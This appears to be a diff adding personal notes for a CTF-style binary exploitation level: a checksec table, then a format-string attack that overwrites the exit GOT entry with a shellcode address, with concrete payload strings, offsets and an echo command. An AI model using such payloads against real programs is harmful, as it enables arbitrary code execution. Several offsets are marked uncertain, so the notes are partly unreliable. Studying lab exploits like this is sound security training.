@@ -1,0 +1,40 @@
+<!-- vim: syntax=Markdown -->
+
+| RELRO | STACK CANARY | NX | PIE | RPATH | RUNPATH | FILE |
+| :---- | :----------- | :- | :-- | :---- | :------ | :--- |
+| <span style="color:yellow">Partial RELRO</span> | <span style="color:red">No canary found</span> | <span style="color:red">NX disabled</span> | <span style="color:red">No PIE</span> | <span style="color:green">No RPATH</span> | <span style="color:green">No RUNPATH</span> | <span style="background-color:red">/home/users/level04/level04</span> |
+
+|    |    |
+| :- | :- |
+| **Architecture** | x86 |
+| **Exploit type** | buffer overflow |
+
+10 %p
+
+printf reads from 40 octets
+
+stack at 144 + (3*4) = 156 (+ 0-15 ?)
+
+gets at esp+0x28 (156 - 40 = 116)
+
+so must write at 116 octets so index 29
+
+%4294956712d%29$n
+
+0xffffd6a8
+
+
+```text
+(gdb) x 0x80497e0
+0x80497e0 <exit@got.plt>:       0x08048376
+```
+
+On doit maintenant écrire l'adresse de `shellcode ?`, `0xffffd6ac` (`4294956716` en décimal) dans `0x080497e0`.
+
+4294956716 - 4 = 4294956712
+
+\xe0\x97\x04\x08%54952d%10$n
+
+echo $'\xe0\x97\x04\x08%54952d%10$n' > f
+
+writes the end of d6ac in the exit got
